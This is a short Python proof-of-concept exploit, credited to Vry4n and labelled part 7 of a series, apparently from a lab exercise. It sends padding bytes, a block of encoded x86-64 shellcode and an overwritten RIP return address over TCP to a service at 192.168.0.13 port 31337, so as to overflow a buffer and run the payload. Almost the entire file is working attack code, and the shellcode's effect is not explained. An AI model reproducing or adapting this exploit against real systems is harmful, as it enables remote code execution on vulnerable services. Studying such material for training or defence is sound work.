#!/usr/bin/python
import socket

# Part 7 of proof of concept by Vry4n
# This script is intended to fill the buffer with As and the payload with the instruction, executing from RIP register

RIP = b"\xfb\x0c\x40\x00"
PAYLOAD =  b""
PAYLOAD += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
PAYLOAD += b"\x05\xef\xff\xff\xff\x48\xbb\x53\xf0\x2a\xaa\x2e"
PAYLOAD += b"\x8b\x87\xe5\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
PAYLOAD += b"\xff\xe2\xf4\x39\xd9\x72\x33\x44\x89\xd8\x8f\x52"
PAYLOAD += b"\xae\x25\xaf\x66\x1c\xcf\x5c\x51\xf0\x3f\x18\xee"
PAYLOAD += b"\x23\x87\xe8\x02\xb8\xa3\x4c\x44\x9b\xdd\x8f\x79"
PAYLOAD += b"\xa8\x25\xaf\x44\x88\xd9\xad\xac\x3e\x40\x8b\x76"
PAYLOAD += b"\x84\x82\x90\xa5\x9a\x11\xf2\xb7\xc3\x3c\xca\x31"
PAYLOAD += b"\x99\x44\x85\x5d\xe3\x87\xb6\x1b\x79\xcd\xf8\x79"
PAYLOAD += b"\xc3\x0e\x03\x5c\xf5\x2a\xaa\x2e\x8b\x87\xe5"
FUZZ = b"A" * (120 - len(PAYLOAD))


print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.13", 31337))
s.recv(1024)
s.send(FUZZ + PAYLOAD + RIP)
s.close()
